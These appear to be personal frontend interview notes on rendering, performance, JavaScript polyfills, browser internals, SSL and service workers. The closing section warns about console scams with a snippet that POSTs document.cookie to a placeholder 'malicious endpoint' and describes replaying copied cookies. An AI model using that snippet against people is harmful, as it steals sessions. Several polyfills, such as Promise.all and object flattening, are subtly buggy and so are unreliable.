+	Client Side Rendering (CSR):-
+			Client Side Rendering is a more modern way to render web pages. 
+			In this method, the server sends only the necessary data and JavaScript files to the browser. 
+			The browser then generates the HTML file and renders it on the user’s screen.
+
+	Differences Between SSR and CSR
+			Performance:-
+					SSR tends to have better performance as the user receives a complete HTML file from the server. 
+					CSR, on the other hand, requires the browser to do more work, which can lead to slower loading times.
+
+					SSR is better for SEO as search engines can easily crawl and index the complete HTML file. 
+					In CSR, the HTML file is generated by JavaScript, which can be difficult for search engines to crawl.
+
+			Security:-
+					SSR is generally considered more secure as the server processes and generates the complete HTML file. 
+					In CSR, the browser has more control over the rendering process, which can lead to security vulnerabilities.
+
+
+.	Assets optimisation in webpages (images, videos, audios, css, js, fonts)
+
+		Image optimisations
+			.		Image compression
+			.	 	Use avif > webp > png for images. ( applicable for videos / fonts as well )
+			.	 	Device pixel ratio:-
+							DPR is a metric that describes the ratio of physical device pixels to logical CSS pixels. 
+							Modern devices, especially high-resolution displays, often have DPR greater than 1. 
+							For example, many smartphones and some laptops have a DPR of 2 or more.
+
+						*	DPR involve delivering different image assets based on the device's pixel density.
+							<img src="image-1x.jpg" srcset="image-1x.jpg 1x, image-2x.jpg 2x, image-3x.jpg 3x" alt="Description">
+
+			.	 	Load different source images for different network conditions (applicable for videos/fonts as well).
+			.	 	Css sprites:-
+							Combine all the individual images into a single sprite image. To decrease the no of requests. // ????
+							https://www.youtube.com/watch?v=WRZEwMo2W80&ab_channel=w3schools.com
+			.	 	Lazy loading
+
+		Font optimisations
+			. 	Font preload
+			. 	Use native fonts provided by browsers
+
+		CSS optimisations
+			.	 	Async CSS loading (similar to async js loading).
+			.	 	Break CSS into chunks and load things asynchronously as it is render blocking
+			.	 	lazy loading
+			.	 	CSS in js
+
+		JS optimisations
+			.	 	script loading (async, defer)
+			.	 	web workers utilisation
+			.	 	Lazy loading
+
+
+.	How to write performant code
+			Accessing and updating the DOM is computationally expensive. So for essential DOM changes, batch them into groups.
+			Loops are expensive, so reduce the amount of loop usage in your code wherever possible.
+
+			Unload the main thread with expensive calculations.
+				.	Use asynchronous code
+				.	Run computation in web workers
+				.	Use WebGPU => 
+							WebGPU is a browser API that allows web developers to use the underlying system's GPU to carry out 
+							high-performance computations and draw complex images that can be rendered in the browser.
+							It is complex, but it can provide even better performance benefits than web workers.
+
+.	CORBS:- 
+		Cross origin Read Blocking is a new security feature that helps to reduce the threat of side-channel attacks. 
+		It is designed to prevent the browser from delivering certain cross-origin network responses to a web page.
+		Ex:- 
+			It will block a cross-origin text/html response requested from a <script> or <img> tag, replace it with an empty response.
+
+	CORS:-
+		Cross-Origin Resource Sharing is an HTTP-header based mechanism. CORS relies on a mechanism by which 
+		browsers make a "preflight" request to the server, in order to check that the server will permit the 
+		actual request. In that preflight, the browser sends headers that will be used in the actual request.
+
+
+.	Web Worker
+				Web Workers are JavaScript scripts that run in the background, separate from the main execution thread 
+				of a web page. They are designed to handle complex computations, keeping the main thread responsive.
+
+				Multithreading: 
+						Web Workers provide a way to run scripts in parallel, allowing the main thread 
+						to remain responsive and handle user interactions without being blocked.
+
+				Separate Thread: 
+						They operate in a separate thread, not sharing the same memory space as the main thread. 
+						Communication between a worker and the main thread happens through a messaging system.
+
+
+Q:-	Have you seen a file ".js.map" in your build folders?
+.	These files are called source maps and they help to navigate to the original source in the minified bundled 
+	build used by error reporting tools to trace the exact file and line at which the error has occurred.
+
+
+.	Generator function
+				The Generator object is returned by a generator function.
+				It is declared by *.
+
+				function* generator() {
+				  yield 1;
+				  yield 2;
+				  yield 3;
+				}
+
+				const gen = generator(); // "Generator { }"
+
+				console.log(gen.next().value); // 1
+				console.log(gen.next().value); // 2
+				console.log(gen.next().value); // 3
+
+
+.	Enums
+			const DaysOfWeek = Object.freeze({ 
+			    SUNDAY: 0, 
+			    MONDAY: 1, 
+			    TUESDAY: 2, 
+			    WEDNESDAY: 3, 
+			    THURSDAY: 4, 
+			    FRIDAY: 5, 
+			    SATURDAY: 6 
+			}); 
+
+
+.	Proxy:-
+		A JS proxy is an object which wraps another object and intercept the fundamental operation of the target object.
+		The fundamental opertaions can be the property lookup, assignment, function invocation etc.
+
+		Create Proxy:-
+				You can create proxy using the Proxy contructor by providing the target and a handler object
+				that defines the custom behavior for various operations.
+
+				const target = {
+					name: 'kasjkdfjkajk'
+				}
+
+				const handler = {
+					get(target, property){
+						return `I am ${target[property]}`
+					}
+				}
+
+				let proxy = new Proxy(target, handler);
+
+				console.log(proxy.name);
+
+
+.	Proxy Traps
+
+
+
+
+.	syntactic sugar 
+
+
+.	Flatten an array
+		function flatten(obj, depth){
+		  let ans = [];
+		  if(Array.isArray(obj)){
+		    for(let i=0;i<obj.length;i++){
+		      let val = obj[i];
+		      if(Array.isArray(val) && depth>0){
+		        let res = flatten(val, depth-1);
+		        ans.push(...res);
+		      }else{
+		        ans.push(val);
+		      }
+		    }
+		  }
+		  return ans;
+		}
+
+		console.log(flatten([[1,2,3],[1,[2,[4,[5]]]]],3));
+
+
+.	Flatten an object
+		function flatten(obj, prevKey=""){
+		  let ans = {};
+		  if(typeof obj === "object" && !Array.isArray(obj)){
+		    for(let key in obj){
+		      let val = obj[key];
+		      console.log("val ",val);
+		      if(typeof val === "object"){
+		        ans = {...flatten(val, prevKey + key + "_")}
+		      }else{
+		        let newKey = prevKey + key;
+		        ans[newKey] = val;
+		      }
+		    }
+		  }
+		  return ans;
+		}
+
+		console.log(flatten({a: { b : {c : 3}, d : 4 } }));
+
+
+.	typescript:-
+		.	gives type safety by throwing error on compile time
+		.	use for static binding
+
+
+.	Cookie:-
+		Cookies are a way to store information that allow tracking of the use session.
+
+.	localStorage vs Cookies:-
+		.	Localstorage is a storage option provided by browser to store some objects which can be of higher size 
+			as well ( the max limit is 5mb).
+			Cookies is another storage option provided by browser to store object with lower size usually in KBs.
+		.	Another difference between the 2 where in every api call all the contents of cookies are sent to server 
+			(for auth / other purposes) while the localstorage is not sent in every call.
+		.	We can set an expiry for cookies which will auto delete the cookie after a time but localstorage can stay forever.
+
+
+.	Weak-Map:-
+		In a Weak Map, every key can only be an object and function. It used to store weak object references.
+		In weakmap values can be of any type. WeakMaps are not iterable.
+		WeakMaps holds the weak reference to the key, not the key itself.
+		The garbage collector removes the key pointer from “WeakMap” and also removes the key from memory. 
+		WeakMaps have some properties : .set, .get, .delete, .has.
+
+		Applications:-
+			.	Where you need to cache data and have it automatically removed when the associated object is no longer used.
+			.	It's used for storing metadata related to DOM nodes without directly modifying the DOM or introducing memory leaks.
+			.	Prevent memory leaks because its keys are weakly referenced.
+
+
+.	requestAnimationFrame:-
+			It is mainly designed to run animations or visual updates on the screen. In invokes the provided callback 
+			before the browser performs a repaint, typically at the start of a new frame. Runs at the speed of 
+			monitor's refresh rate ensuring smoother and synchronized animations. Pauses automatically when the 
+			user switches to another browser tab or when the page is not visible or an iframe is hidden.
+
+
+			let output = document.getElementById("output");
+			let box = document.getElementById("box");
+			let number = 0;
+			let xposition = 0;
+
+			function move(timeStamp) {
+			  // high resolution Dom Timestamp (means how much time it is taking to execute the current frame)
+			  // timestamp is the time between two frames. Measured in ms but more accurate than Date.now() or performance.now()
+			  if (timeStamp) {
+			    let diff = timeStamp - number;
+			    console.log("frame ", diff);
+			    number = timeStamp;
+			  }
+			  xposition += 5;
+			  box.style.transform = `translateX(${xposition}px)`;
+			  let vw = document.body.clientWidth - 100;
+			  if (xposition < vw) {
+			    requestAnimationFrame(move);
+			  }
+			}
+
+			requestAnimationFrame(move);
+
+
+Q-	Can we requestAnimationFrame at place of setInterval?
+
+
+.	Browser's Idle Period:-
+		The time/period when browser is not executing any high priority task.
+
+
+.	requestIdleCallback():-
+			requestIdleCallback() is a method in JavaScript that schedules a function to be executed 
+			during a browser's idle periods. This allows developers to perform less critical or 
+			non-essential tasks without affecting the performance of more crucial operations.
+
+			The browser calls the callback function when it's idle, means it's not executing critical or high-priority tasks. 
+			It passes "IdleDeadline" object to the callback, which contain info about how much time is left until the next frame is due.
+
+
+.	setTimeout Polyfill:-
+
+			const timerMap = {};	// now we can wrap this object and setTimeout polyfill in another function
+
+			function setTimeoutPoly(cb, delay, ...args){
+			  let timerId = Math.random();
+			  timerMap[timerId] = true;		// we are using timerMap because there can be multiple setTimeouts
+			  
+			  let start = Date.now();
+			  
+			  function helper(){
+			  	if(!timerMap[timerId]) return;
+
+			    if(Date.now()-start > delay){
+			      cb.apply(this, args);
+			      delete timerMap[timerId]; // remove timer entry once the callback is executed
+			    }else{
+			      requestIdleCallback(helper);
+			    }
+			  }
+			  requestIdleCallback(helper);
+			  
+			  return timerId;
+			}
+
+
+			function clearTimeoutPoly(id){
+				delete timerMap[id];
+			}
+
+			console.log("start");
+
+			setTimeoutPoly((args)=>{
+			  console.log("hello");
+			},1000);
+
+			console.log("end");
+
+
+.	setInterval polyfill:-
+
+		function createSetIntervalPolyfill() {
+		  let intervalMap = {};
+
+		  function setIntervalPollyfill(callback, delay = 0, ...args) {
+		    let id = Math.random();
+
+		    function repeat() {
+		      intervalMap[id] = setTimeout(() => {
+		        if(!intervalMap[id]) return;
+		        callback.apply(this, args);
+		        repeat();
+		      }, delay);
+		    }
+
+		    repeat();
+		    return id;
+		  }
+
+		  function clearIntervalPollyfill(intervalid) {
+		    clearTimeout(intervalMap[intervalid])
+		    delete intervalMap[intervalid]
+		  }
+
+		  return { setIntervalPollyfill, clearIntervalPollyfill };
+		}
+
+		const { setIntervalPollyfill, clearIntervalPollyfill } = createSetIntervalPolyfill();
+
+		let counter = 0;
+
+		let intervalid = setIntervalPollyfill(()=>{
+		  counter++;
+		  if(counter >= 100) {
+		    clearIntervalPollyfill(intervalid)
+		  }
+		  console.log("Helloooooo....")
+		}, 1000)
+
+
+.	node.childNodes vs node.children	(try to use .children)
+
+.	parentNode vs parentElement
+
+.	npm vs yarn vs pnpm
+
+
+*********************************************************************************************************************
+*************************************************		Advance concept 	***********************************************
+*********************************************************************************************************************
+
+
+
+.	how browsers work and things happen
+		So we will cover what happens when you type any domain name in search bar in browser
+		Step 1:- 	DNS lookup , it will locate which server is your domain pointing. This is called 
+							DNS lookup and after this step a connction is established between server and browser.
+
+		Step 2:- 	After connection established the html file is served to browser by the server which is used to render the page.
+
+		Step 3:- 	In this step the browser starts parsing the data recieved from the server into DOM and CSSOM (CSS Object model).
+
+		Step 4:- 	Javascript is compiled and interpreted. Also in this step accessibility tree is generated.
+
+		Step 5:- 	Rendering steps include style, layout, paint, and in some cases compositing. The CSSOM and DOM trees 
+							created in the parsing step are combined into a render tree which is then used to compute the layout 
+							of every visible element, which is then painted to the screen.
+
+				Style:- 	This step combines the DOM and CSSOM into a render tree. The computed style tree, or render tree, 
+									construction starts with the root of the DOM tree, traversing each visible node.
+
+				Layout:-	This step compute the geometry of each node of render tree.
+
+				Paint:-		Paints individual part of the screen. Its the first time something is visible on screen.
+
+				These above few steps are part of critical rendering path.
+
+		Step 6:- 	Interactivity
+				Once the main thread is done painting the page, you would think we would be "all set." 
+				That isn't necessarily the case. If the load includes JavaScript, that was correctly deferred, 
+				and only executed after the onload event fires, the main thread might be busy, and 
+				not available for scrolling, touch, and other interactions. 
+				Time to Interactive (TTI) is the measurement of how long it took from that first request 
+				which led to the DNS lookup and TCP connection to when the page is interactive.
+
+
+.	Critical rendering path:-
+		The Critical Rendering Path is the sequence of steps the browser goes through to convert the HTML, CSS, 
+		and JavaScript into pixels on the screen. Optimizing the critical render path improves render performance. 
+		It includes the Document Object Model (DOM), CSS Object Model (CSSOM), render tree and layout.
+
+		A request for a web page starts with an HTML request. The server returns the HTML - response headers and data. 
+		The browser then begins parsing the HTML, converting the received bytes to the DOM tree. The browser initiates 
+		requests every time it finds links to external resources, like stylesheets, scripts, or embedded image references. 
+		Some requests are blocking, which means the parsing of the rest of the HTML is halted until the importing done. 
+		The browser continues to parse the HTML making requests and building the DOM, at the end it constructs the 
+		CSS object model. With the DOM and CSSOM complete, the browser builds the render tree, computing the styles 
+		for all the visible content. After the render tree is complete, the page is rendered, or 'painted' on the screen.
+
+		Render Tree:-
+			The render tree captures both the content and the styles. The DOM and CSSOM tree are combined into render tree. 
+			To construct the render tree, the browser checks every node, starting from root of the DOM tree, 
+			and determines which CSS rules are attached. The render tree only captures visible content.
+
+		Layout:-
+			The layout step determines where and how the elements are positioned on the page, determining the width and 
+			height of each element, and their relation to each other. Layout performance is impacted by the DOM — 
+			the greater the number of nodes, the longer layout takes. Layout can become a bottleneck during scrolling 
+			or other animations. Any time the render tree is modified, such as by added nodes, altered content, or 
+			updated box model styles on a node, layout occurs. To reduce the frequency and duration of layout events, 
+			batch updates and avoid animating box model properties.
+
+		Paint:-
+			The last step is painting the pixels to the screen. Once the render tree is created and layout occurs, 
+			the pixels can be painted to the screen. On load, the entire screen is painted. After that, only impacted areas 
+			of the screen will be repainted, as browsers are optimized to repaint the minimum area required. 
+			Paint time depends on what kind of updates are being applied to the render tree.
+
+
+.	Configuring an engine's memory model
+
+		The max amount of available heap memory in nodeJS can be increased with a flag:
+		node --max-old-space-size=6000 index.js
+		Some of the common pitfalls for memory leakage
+
+		Some of the very common causes of memory leakage in the application is given below.
+			.	Excessive use of globals by creating global variables or by omitting the var keyword in local scope
+			.	Forgetting the clearing of timers like setInterval()
+			.	Unnecessary use of closures
+
+		Data structure which helps in memory management :
+			Although JavaScript does not directly expose the garbage collector API, but JS offers 
+			several data structures that indirectly observe garbage collection and can be used to 
+			manage memory usage. Some of these Data structures are weakSet and weakMap.
+
+
+.	Memory management in browsers:-
+		.	Allocate memory
+		.	Use the memory
+		.	Release the memory
+				.	Garbage collection
+						.	Mark and sweep algorithm
+
+5-	
+10- 1298
+20-	2596
+
+
+
+.	Promise Polyfills:-
+		1.Promise=>
+				const PENDING = 0
+				const FULFILLED = 1
+				const REJECTED =  2  // 3 state for promises
+
+				function customPromise(executor) {
+				  
+				  let state=PENDING // initially pending
+				  let value
+				  let thenHandler=[] //callback handlers for success (.then)
+				  let catchHandler=[]//callback handlers for failures (.catch)
+				  function resolve(val){
+				  	if(state!==PENDING) return
+				    state=FULFILLED // changing state if resolved
+				    value=val 
+				    thenHandler.forEach(fn=>fn(value)) // calling the callback functions  if resolved here 
+				    
+				  }
+				  function reject(err){
+				  if(state!==PENDING) return
+				    state=REJECTED // changing state if failed
+				    value=err
+				    catchHandler.forEach(fn=>fn(value)) //calling the failure function if rejected here
+				  }
+				  this.then=function(callback){
+				  	if(state===FULFILLED){
+				    	return value
+				    }else{
+				    	thenHandler.push(callback) // calling callbacks if resolved in .then 
+				    }
+				    return this
+				  } 
+				  this.catch=function(callback){
+				  	if(state===REJECTED){
+				    	return value
+				    }else{
+				    	catchHandler.push(callback)// calling callbacks if rejected in .catch
+				    }
+				    return this
+				  }
+				  executor(resolve, reject) // executor function which gets called on promise initialisation
+				}
+
+
+				const myPromise = new customPromise((res, rej) => setTimeout( 
+				  () => res('resolved'),// this is the executor function
+				  1000))
+
+				myPromise
+				  .then(res => console.log(res, 'resolved'))
+				.catch(res=>console.log(res,'rejected'))
+
+
+		2.Promise.all()=>
+				Things to care about writing polyfill Array response has to be returned from the polyfill 
+				with all success or error message in case of failure.
+
+					const p1 = new Promise((res, rej) => {
+					  setTimeout(() => {
+					    res("resolve 1");
+					  }, 2000);
+					});
+
+					const p2 = Promise.resolve("resolved 2");
+
+					const p3 = new Promise((res, rej) => {
+					  setTimeout(() => {
+					    rej("reject 3");
+					  }, 1000);
+					});
+
+
+					const taskArray = [p1, p2, p3];
+
+					const promiseAllPolyfill = (taskArray) => {
+					  return new Promise((resolve, reject) => {
+					    const ans = [];
+					    taskArray.forEach((promise, index) => {
+					      promise.then(data => {
+					        ans[index] = data;
+					        if(index === taskArray.length-1){
+					          resolve(ans);
+					        }
+					      }).catch(error => {
+					        reject(error);
+					      });
+					    });
+					  });
+					}
+
+					promiseAllPolyfill(taskArray)
+					.then(data => {
+					  console.log(data);
+					})
+					.catch(error => {
+					  console.log("error ",error)
+					});
+
+
+					
+
+
+		3.Promise.any()=>
+				Things to care about writing polyfill single response has to be returned from the polyfill 
+				with all success or array of error messages in case of failure.
+
+				const p1 = new Promise((res, rej) => {
+				  setTimeout(() => {
+				    rej("res 1")
+				  }, 100)
+				})
+
+				const p2 = Promise.reject("resolved 2")
+
+				const p3 = new Promise((res, rej) => {
+				  setTimeout(() => {
+				    rej("rej 1")
+				  }, 1000)
+				})
+
+				function customPromiseAny(arr) {
+				  let errCounter = 0
+				  const errMap=[]
+				  return new Promise(async (res, rej) => {
+					for(let i=0 ;i < arr.length; i++){
+						Promise.resolve(arr[i]).then(res).catch(err=>{
+							errMap[i]=err
+							errCounter++
+							if(errCounter === arr.length){
+								rej(errMap)
+							}
+						})
+					}
+				  })
+				}
+
+				const pAll1 = customPromiseAny([p1, p2, p3])
+
+				pAll1.then(res => console.log(res)).catch(Err => console.log(Err))
+
+
+		4.Promise.race()=>
+				const p1 = new Promise((res, rej) => {
+				  setTimeout(() => {
+				    res("res 1")
+				  }, 100)
+				})
+
+				const p2 = Promise.resolve("resolved 2")
+
+				const p3 = new Promise((res, rej) => {
+				  setTimeout(() => {
+				    res("rej 1")
+				  }, 1000)
+				})
+
+				function customPromiseRace(arr) {
+				  let errCounter = 0
+				  const errMap=[]
+				  return new Promise(async (res, rej) => {
+					for(let i=0 ;i < arr.length; i++){
+						Promise.resolve(arr[i]).then(resp=>{
+							res(resp)
+						}).catch(err=>{
+							rej(err)
+						})
+					}
+				  })
+				}
+
+				const pAll1 = customPromiseRace([p1, p2, p3])
+
+				pAll1.then((err)=>console.log(err,'p1')).catch((err)=>console.log(err,'p2'))
+
+
+.	JS does not have the functionality to fetch the files from our computer but thees functionality are provided by
+	V8 engine which is written in c++. So because of c++ JS can access the file system.
+
+
+.	What is JSON?
+		It stands for JavaScript Object Notation. JSON syntax is derived from Javascript objects, 
+		but the JSON format is text only, meaning a JSON object is quite literally just a string.
+
+.	When do we use a JSON object?
+		JSON is used to read data from a web server and then display that data onto a webpage. 
+		When we exchange data b/w a browser and a server it can only be text, hence we can use JSON for this.
+		We can convert json to JS object by JSON.parse().
+		JSON.stringify() will convert a JavaScript object into a JSON object that can then be sent to a web server.
+		The main difference is that in a JSON object the keys must be a string written with double quotes.
+
+		JSON Data Types
+			.	string
+			.	number
+			.	object (JSON object)
+			.	array
+			.	boolean
+			.	Null
+
+		JSON values cannot be:
+			.	A function
+			.	A date
+			.	undefined
+
+
+.	Pipe method in js:-
+		The concept of pipe is simple it combines n functions. It’s a pipe flowing left-to-right, 
+		calling each function with the output of the last one.
+
+	Compose in js:-
+		Same as pipe but in reverse direction
+
+	JS don't have built in pipe and compose function.
+
+
+
+.	SSL:-
+		Secure Sockets Layer is an encryption-based Internet security protocol. It was first developed by Netscape 
+		in 1995 for the purpose of ensuring privacy, authentication, and data integrity in Internet communications. 
+		SSL is the predecessor to the modern TLS encryption used today.
+		SSL more commonly called TLS (Transport Layer Security) , is a protocol for encrypting Internet traffic 
+		and verifying server identity. Any website with an HTTPS web address uses SSL/TLS. 
+
+
+.	What is an SSL certificate?
+		SSL can only be implemented by websites that have an SSL certificate (technically a "TLS certificate"). 
+		An SSL certificate is like an ID card or a badge that proves someone is who they say they are. 
+		SSL certificates are stored and displayed on the Web by a website's or application's server.
+
+		One of the most important pieces of information in an SSL certificate is the website's public key. 
+		The public key makes encryption and authentication possible. A user's device views the public key and 
+		uses it to establish secure encryption keys with the web server. Meanwhile the web server also has 
+		a private key that is kept secret; the private key decrypts data encrypted with the public key.
+
+
+.	Why are SSL certificates required?
+		SSL certificates are what enable websites to use HTTPS, which is more secure than HTTP. An SSL certificate 
+		is a data file hosted in a website's origin server. SSL certificates make SSL/TLS encryption possible, 
+		and they contain the website's public key and the website's identity, along with related information.
+			
+
+.	How does SSL/TLS work?
+		.	To provide a high degree of privacy, SSL encrypts data that is transmitted across the web. This means that anyone 
+			who tries to intercept this data will only see a garbled mix of characters that is nearly impossible to decrypt.
+		.	SSL initiates an authentication process called a 'handshake' between two communicating devices to ensure that 
+			both devices are really who they claim to be.
+		.	SSL also digitally signs data in order to provide data integrity, verifying that the data is not tampered with.
+
+
+.	Why is SSL/TLS important?
+		Originally, data on the Web was transmitted in plaintext that anyone could read if they intercepted the message. 
+		For example, if a consumer visited a shopping website, placed an order, and entered their credit card number 
+		on the website, that credit card number would travel across the Internet unconcealed.
+
+		SSL was created to tackle this problem and protect user privacy by encrypting any data that goes between a user and web server.
+
+.	Are SSL and TLS the same thing?
+		SSL is the direct predecessor of another protocol called TLS (Transport Layer Security).
+		In 1999 SSL name changed to TLS.
+
+.	What are the types of SSL certificates?
+		1.	Single-domain
+		2.	Wildcard =>	A wildcard SSL certificate applies to only one domain and it also includes that domain's subdomains.
+		3.	Multi-domain
+
+.	SSL certificates Levels
+		1.	Domain Validation
+		2.	Organization Validation
+		3.	Extended Validation
+
+
+.	What are design patterns? 
+		(https://www.patterns.dev/)
+		Design patterns are a fundamental part of software development, as they provide typical solutions to 
+		commonly recurring problems in software design. Rather than providing specific pieces of software, 
+		design patterns are merely concepts that can be used to handle recurring themes in an optimized way.
+
+		Over the past couple of years, the web development ecosystem has changed rapidly. Whereas some 
+		well-known design patterns may simply not be as valuable as they used to be, others have evolved 
+		to solve modern problems with the latest technologies.
+
+		There are multiple design patterns in react like singleton pattern , provider ,proxy etc . 
+
+
+		1.	Singleton classes are classes which can be instantiated once, and can be accessed globally. 
+				This single instance can be shared throughout our application, which makes Singletons great for managing 
+				global state in an application. It has a get instance and a set instance where you can set and retrieve data.
+
+				Advantages:- 
+					Only one instance of the class in whole application.
+
+
+.	Virtualisation in web applications
+			The concepts which is used heavily in frontend applications for managing and displaying large lists.
+
+			The main idea of virtualisation is rendering only the visible rows or columns from a large list of data. 
+			Lets say you have 500 items to be shown on a UI, meaning 500 divs (bare minimum) each with a height of 30px. 
+			So total height of these 500 divs are 15000px which obviously wont make sense to render all at once. 
+			So what virtualisation will do is calculate how many divs to show based on current screen size (40 in our case).
+			As user scroll next set of divs get rendered while the divs scrolled above will be removed from DOM.
+
+		.	How can you use it in your applications ?
+				You may use react-window or react-virtualised library and implement it in your application.
+
+		.	What is used within the hood for virtualisation ?
+				To track and manage scroll they use the intersection observer API which helps in 
+				tracking scroll and further extra logic to add and remove elements from DOM.
+	
+
+.	What is a service worker ?
+		(https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API)
+		Service workers essentially act as proxy servers that sit between web applications, browser, and the network 
+		(when available). They are intended, among other things, to enable the creation of effective offline experiences, 
+		intercept network requests and take appropriate action based on whether the network is available, and 
+		update assets residing on the server. They will also allow access to push notifications and background sync APIs.
+
+		Will running a service worker block main thread ?
+		A service worker is run in a worker context: it therefore has no DOM access, and runs on a different thread 
+		to the main JavaScript that powers your app, so it is non-blocking. It is designed to be fully async; as a 
+		consequence, APIs such as synchronous XHR and Web Storage can't be used inside a service worker.
+
+		Where does it run ?
+		Service workers only run over HTTPS, for security reasons. Most significantly, HTTP connections are 
+		susceptible to malicious code injection by man in the middle attacks, and such attacks could be worse 
+		if allowed access to these powerful APIs.
+
+
+		Lifecycle of SW?
+		Broadly it has 3 stages
+		- Download
+		- Install
+		- Activate
+
+
+.	How to style console logs in our web application and found it good?
+		There is a parameter which can help us with that. Thats cool, but at the end he asked a question 
+		"Do you think you can get hacked from your console log?".
+
+		.	Well what do you think about this?
+				Can someone access your linkedin / instagram account if you give them access to your console ?
+
+				To some extent its true and very much possible .
+
+		Lets decode it ....
+
+		When you login to any website the browser and server each remember your login via something called as cookies 
+		Cookie storage have cookies with them which has the login identity for your account on that browser. 
+		So if someone has the access to your cookies they may login to your account and do anything they want. 
+		Try it with opening any website and logging in and copying its cookies. Then open site in incognito(dont login) 
+		and paste all the cookies there and see the magic.
+
+.	How will someone access cookies from your console?
+		Well in console you have access to all browser storage include cookies.
+		Open up your console and type document(dot)cookies and see it yourself.
+
+		Lets say someone gave you a script similar to below and tell you to paste it in your console 
+		for instagram or any other site then what things can happen ?
+
+		script
+		( ()=>{
+		fetch("malicious endpoint",{method:"POST",body: document.cookie})
+		} )()
+
+		with this simple script as soon as you paste it in console the hacker can get all your cookies data and 
+		maybe localstorage and other storage etc.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
